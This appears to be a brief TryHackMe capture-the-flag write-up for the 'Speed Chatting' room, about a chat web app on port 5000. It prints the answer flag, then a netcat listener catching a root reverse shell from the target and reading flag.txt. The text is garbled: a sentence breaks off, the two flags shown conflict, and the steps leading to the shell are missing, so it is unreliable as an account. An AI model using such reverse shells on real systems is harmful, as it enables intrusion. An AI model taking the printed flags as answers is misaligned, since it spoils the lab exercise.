# <div align="center">[Speed Chatting - TryHackMe Write-up](https://tryhackme.com/room/lafb2026e5)</div>
<div align="center">Can you hack as fast as you can chat?</div>
<br>
<div align="center">
  <img width="200" height="200" alt="Speed-Chatting" src="https://github.com/user-attachments/assets/6046f144-cdce-4ae6-bd3e-fb725460cc77" />
</div>

## Task 1. Speed Chat
### What is the flag?
```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

Accessing the Website
The objective of this room is 

As soon as I started the lab, most of the initial enumeration was already handled.


<img width="1018" height="819" alt="image" src="https://github.com/user-attachments/assets/bfa9fc40-151a-4ecc-9283-154a04b59ae1" />

The target application is running on port 5000, so I navigated directly to the web interface.


death@esther:~/php-reverse-shell$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.49.147.207 52138
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2204:/opt/Speed_Chat# ls
ls
app.py
flag.txt
uploads
root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
cat flag.txt
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# 
